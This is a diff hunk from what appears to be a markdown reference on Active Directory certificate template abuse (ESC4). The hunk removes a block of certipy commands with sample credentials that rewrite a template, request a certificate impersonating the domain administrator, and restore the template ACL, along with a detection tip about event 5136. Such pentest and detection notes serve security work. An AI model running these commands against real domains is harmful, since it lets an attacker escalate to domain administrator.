@@ -21,21 +21,3 @@ The attacker holds **write access on a template**, edits it to allow **SAN suppl
 
 ### Commands
 ```bash
-# ── Modify template to enable SAN supply ────────────────────────────
-certipy template -u lowpriv@corp.local -p 'Password123!' \
-  -template VulnerableTemplate -save-old
-
-# ── Exploit as ESC1 ──────────────────────────────────────────────────
-certipy req -u lowpriv@corp.local -p 'Password123!' \
-  -ca CORP-CA -template VulnerableTemplate \
-  -upn administrator@corp.local
-
-# ── Restore the original ACL ─────────────────────────────────────────
-certipy template -u lowpriv@corp.local -p 'Password123!' \
-  -template VulnerableTemplate -restore
-```
-
-### Detection
-**5136** on `pKICertificateTemplate`; monitor template ACL changes and `msPKI-*` attribute edits.
-
----
